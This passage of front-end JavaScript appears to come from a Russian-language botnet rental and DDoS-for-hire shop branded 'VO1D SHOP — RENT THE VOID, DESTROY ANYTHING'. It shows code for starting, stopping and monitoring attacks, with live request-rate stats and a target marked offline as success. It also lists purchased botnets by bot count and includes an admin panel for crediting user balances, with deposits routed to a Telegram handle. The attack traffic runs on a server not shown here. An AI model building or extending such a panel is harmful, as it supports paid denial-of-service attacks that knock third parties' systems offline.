    <style>

        @keyframes scanline { 0% { transform: translateY(-100%); } 100% { transform: translateY(100vh); } }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse { 0%, 100% { box-shadow: 0 0 20px rgba(139, 92, 246, 0.3); } 50% { box-shadow: 0 0 50px rgba(139, 92, 246, 0.6); } }

        @keyframes matrixRain { 0% { background-position: 0% 0%; } 100% { background-position: 0% 100%; } }
        @keyframes glitchSweep { 0% { left: -100%; } 100% { left: 100%; } }
        @keyframes slideInRight { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }

        .btn-glitch:hover { transform: scale(1.05); }

                if (res.success) { showNotification('⏹ Атака остановлена', 'warning'); addLogLine(`⏹ Атака остановлена`); $('startAttackBtn').disabled = false; $('stopAttackBtn').disabled = true; if (attackInterval) { clearInterval(attackInterval); attackInterval = null; } activeAttackId = null; }
                else showModal('Ошибка', res.error || 'Не удалось остановить');
            } catch(e) { showModal('Ошибка', 'Сервер недоступен'); }
        };

        function startAttackMonitoring(attackId) {
            if (attackInterval) clearInterval(attackInterval);
            addLogLine(`📡 Мониторинг атаки ${attackId}...`);
            let startTime = Date.now();
            let lastRequests = 0;
            attackInterval = setInterval(async () => {
                try {
                    const res = await apiFetch(`/attack/${attackId}/status`);
                    if (res.error) { addLogLine(`❌ Ошибка: ${res.error}`); return; }
                    const stats = res.stats || {};
                    const elapsed = Math.floor((Date.now() - startTime) / 1000);
                    $('statRequests').textContent = stats.total_requests || 0;
                    $('statErrors').textContent = stats.failed_requests || 0;
                    $('statRps').textContent = stats.rps || 0;
                    $('statBytes').textContent = stats.bytes_sent ? Math.round(stats.bytes_sent / 1024) : 0;
                    const status = stats.target_status || 'online';
                    $('statStatus').textContent = status === 'online' ? '🟢' : '🔴';
                    $('targetStatus').textContent = status === 'online' ? '🟢 Цель: онлайн' : '🔴 Цель: офлайн (УСПЕХ!)';
                    $('targetStatus').className = `target-status ${status}`;
                    $('attackTimer').textContent = `⏱ ${elapsed}с / ${res.duration_seconds || 0}с`;
                    const progress = res.duration_seconds ? Math.min(100, (elapsed / res.duration_seconds) * 100) : 0;
                    $('attackProgress').style.width = progress + '%';
                    const rps = stats.rps || 0;
                    if (rps > 0 && rps !== lastRequests) { addLogLine(`📊 RPS: ${rps}, Запросов: ${stats.total_requests || 0}, (цель падает): ${stats.failed_requests || 0}`); lastRequests = rps; }
                    if (res.status !== 'running') { addLogLine(`🏁 Атака завершена. Статус: ${res.status}. Успешно: ${stats.failed_requests || 0}`); clearInterval(attackInterval); attackInterval = null; $('startAttackBtn').disabled = false; $('stopAttackBtn').disabled = true; activeAttackId = null; showNotification('🏁 Атака завершена!', 'success'); }
                } catch(e) {}
            }, 1000);
        }

        function addLogLine(msg) {
            const log = $('attackLog');
            if (!log) return;
            const line = document.createElement('div');
            line.className = 'log-line';
            line.innerHTML = `<span class="time">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
            log.appendChild(line);
            log.scrollTop = log.scrollHeight;
            if (log.children.length > 200) log.removeChild(log.firstChild);
        }

        // ============================================================
        // PROFILE
        // ============================================================

        async function renderProfile() {
            if (!currentUser) { navigateTo('login'); return; }
            pageContainer.innerHTML = `<h1>👤 Профиль</h1><div class="dash-card" style="max-width:500px;"><div class="form-group"><label>Логин</label><input type="text" value="${currentUser.username}" disabled></div><div class="form-group"><label>Email</label><input type="email" value="${currentUser.email||''}" disabled></div><div class="form-group"><label>💰 Баланс</label><input type="text" value="${formatCurrency(currentUser.balance)}" disabled style="color:var(--accent-green);"></div><div class="form-group"><label>Роль</label><input type="text" value="${currentUser.role||'user'}" disabled></div>${currentUser.api_key ? `<div class="form-group"><label>🔑 API Key</label><input type="text" value="${currentUser.api_key}" disabled></div>` : ''}<div style="display:flex;gap:12px;flex-wrap:wrap;"><button class="btn btn-gold btn-glitch" onclick="window.showDepositModal()">💎 ПОПОЛНИТЬ</button><button class="btn btn-outline" style="color:var(--accent-red);" onclick="logout()">🚪 Выйти</button></div></div><h2 style="margin-top:24px;">📦 Мои ботнеты</h2><div id="profileBotnets" class="botnet-list"></div>`;
            try {
                const botnets = await apiFetch('/my-botnets');
                if (!botnets.error) {
                    const container = $('profileBotnets');
                    if (!container) return;
                    if (botnets.length === 0) { container.innerHTML = '<p style="color:var(--text-secondary);">Нет ботнетов.</p>'; }
                    else { container.innerHTML = botnets.map(b => `<div class="botnet-item ${b.active?'':'expired'}"><div class="info"><div class="count">🤖 ${b.bot_count} ботов</div><div class="meta">${b.duration_days} дней · ${formatCurrency(b.price)}</div></div><div class="status ${b.active?'active':'expired'}">${b.active?'✅ Активен':'⏳ Истёк'}</div></div>`).join(''); }
                }
            } catch(e) {}
        }

        // ============================================================
        // ADMIN
        // ============================================================

        async function renderAdmin() {
            if (!currentUser || currentUser.role !== 'admin') { navigateTo('home'); return; }
            pageContainer.innerHTML = `<h1>🔧 Админ-панель</h1><div class="dash-card" style="margin:16px 0;border-color:var(--accent-gold);"><div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;"><span style="font-size:20px;font-weight:700;color:var(--accent-gold);">💎 ПОПОЛНИТЬ БАЛАНС</span><input type="text" id="depositUsername" placeholder="Логин пользователя" style="flex:1;min-width:150px;"><input type="number" id="depositAmount" placeholder="Сумма $" style="width:150px;"><button class="btn btn-green btn-glitch" onclick="window.adminDeposit()">💎 ПОПОЛНИТЬ</button></div><div style="margin-top:8px;font-size:13px;color:var(--text-secondary);">💡 Введите логин и сумму, затем нажмите "ПОПОЛНИТЬ"</div></div><div class="dash-grid" id="adminStats"></div><h2 style="margin-top:24px;">👥 Пользователи</h2><div id="adminUsers"></div>`;
            await refreshAdmin();
        }

        async function refreshAdmin() {
            try {
                const stats = await apiFetch('/admin/stats');
                if (!stats.error) {
                    const container = $('adminStats');
                    if (!container) return;
                    container.innerHTML = `<div class="dash-card"><div class="card-title">👥 Пользователей</div><div class="card-value purple">${stats.total_users||0}</div></div><div class="dash-card"><div class="card-title">🤖 Продано ботнетов</div><div class="card-value green">${stats.total_botnets||0}</div></div><div class="dash-card"><div class="card-title">⚔️ Активных атак</div><div class="card-value red">${stats.active_attacks||0}</div></div><div class="dash-card"><div class="card-title">💰 Доход (без админа)</div><div class="card-value gold">${formatCurrency(stats.total_revenue||0)}</div></div>`;
                }
                const users = await apiFetch('/admin/users');
                if (!users.error) {
                    const container = $('adminUsers');
                    if (!container) return;
                    let html = `<table class="admin-table"><thead><tr><th>ID</th><th>Логин</th><th>Email</th><th>Баланс</th><th>Роль</th><th>Статус</th><th>Действия</th></tr></thead><tbody>`;
                    users.forEach(u => {
                        const isBanned = u.banned === 1 || u.banned === true;
                        html += `<tr><td>${u.id}</td><td>${u.username}</td><td>${u.email||''}</td><td style="color:var(--accent-green);font-weight:700;">${formatCurrency(u.balance)}</td><td><span class="badge ${u.role==='admin'?'admin':'user'}">${u.role||'user'}</span></td><td>${isBanned ? '<span class="badge banned">Забанен</span>' : '✅ Активен'}</td><td>${isBanned ? `<button class="btn btn-green btn-sm" onclick="adminUnban(${u.id})">Разбан</button>` : `<button class="btn btn-red btn-sm" onclick="adminBan(${u.id})">Забанить</button>`}</td></tr>`;
                    });
                    html += '</tbody></table>';
                    container.innerHTML = html;
                }
            } catch(e) { console.error(e); }
        }

        window.adminBan = async function(userId) {
            if (!confirm('Забанить пользователя?')) return;
            try { const res = await apiFetch(`/admin/ban/${userId}`, { method: 'POST' }); if (res.success) { refreshAdmin(); showModal('✅', 'Пользователь забанен'); } else showModal('Ошибка', res.error||''); } catch(e) { showModal('Ошибка', 'Сервер недоступен'); }
        };

        window.adminUnban = async function(userId) {
            try { const res = await apiFetch(`/admin/unban/${userId}`, { method: 'POST' }); if (res.success) { refreshAdmin(); showModal('✅', 'Пользователь разбанен'); } else showModal('Ошибка', res.error||''); } catch(e) { showModal('Ошибка', 'Сервер недоступен'); }
        };

        // ============================================================
        // ДОПОЛНИТЕЛЬНЫЕ ФУНКЦИИ
        // ============================================================

        window.showDepositModal = function() {
            showModal('💎 Пополнение баланса', '<p style="font-size:16px;">Пополните баланс для покупки ботнетов и поисков.</p>', [{ label: '📱 Написать @VO1D_NETWORK', cls: 'btn-gold', action: '()=>{ window.open("https://t.me/VO1D_NETWORK","_blank"); }' }], '💰', true);
        };

        window.adminDeposit = async function() {
            const username = document.getElementById('depositUsername').value.trim();
            const amount = parseFloat(document.getElementById('depositAmount').value);
            if (!username || !amount || amount <= 0) { showModal('❌ Ошибка', 'Введите логин и сумму (больше 0)'); return; }
            try {
                const res = await apiFetch('/admin/add_balance', { method: 'POST', body: JSON.stringify({ username, amount }) });
                if (res.error) { showModal('❌ Ошибка', res.error); return; }
                if (res.success) { showModal('✅ Пополнено!', `<p>💰 Новый баланс <strong>${res.username}</strong>: <strong style="color:var(--accent-green);">${formatCurrency(res.new_balance)}</strong></p><p>➕ Добавлено: <strong style="color:var(--accent-gold);">${formatCurrency(res.added)}</strong></p>`, [{ label: '🔄 Обновить', cls: 'btn-purple', action: '()=>{ closeModal(); refreshAdmin(); }' }]); setTimeout(refreshAdmin, 500); }
            } catch(e) { showModal('❌ Ошибка', 'Сервер недоступен'); }
        };

        window.logout = function() {
            localStorage.removeItem(TOKEN_KEY);
            localStorage.removeItem(USER_KEY);
            currentUser = null;
            if (attackInterval) { clearInterval(attackInterval); attackInterval = null; }
            activeAttackId = null;
            showNotification('👋 Вы вышли из системы', 'info');
            navigateTo('home');
        };

        console.log(`%c\n╔═══════════════════════════════════════╗\n║                                       ║\n║   ██╗   ██╗ ██████╗ ██╗ ██████╗     ║\n║   ██║   ██║██╔═══██╗██║██╔═══██╗    ║\n║   ██║   ██║██║   ██║██║██║   ██║    ║\n║   ╚██╗ ██╔╝██║   ██║██║██║   ██║    ║\n║    ╚████╔╝ ╚██████╔╝██║╚██████╔╝    ║\n║     ╚═══╝   ╚═════╝ ╚═╝ ╚═════╝     ║\n║                                       ║\n║      VO1D SHOP — RENT THE VOID       ║\n║          DESTROY ANYTHING            ║\n║                                       ║\n╚═══════════════════════════════════════╝\n`, 'color: #8b5cf6; font-size: 14px; font-weight: bold;');
        console.log('%c🔥 WELCOME TO THE VOID, HACKER!', 'color: #06d6a0; font-size: 18px; font-weight: bold;');

        function init() {
            const saved = localStorage.getItem(USER_KEY);
            if (saved) {
                try {
                    currentUser = JSON.parse(saved);
                    const token = localStorage.getItem(TOKEN_KEY);
                    if (!token) { currentUser = null; localStorage.removeItem(USER_KEY); }
                } catch(e) { currentUser = null; }
            }
            renderNav();
            navigateTo(currentUser ? 'dashboard' : 'home');
            initFakeNotifications();

            setInterval(async () => {
                if (currentUser) {
                    try {
                        const profile = await apiFetch('/profile');
                        if (!profile.error) {
                            currentUser.balance = profile.balance;
                            localStorage.setItem(USER_KEY, JSON.stringify(currentUser));
                            userBalance.textContent = formatCurrency(currentUser.balance);
                        }
                    } catch(e) {}
                }
            }, 30000);
        }

        document.addEventListener('DOMContentLoaded', init);
    })();
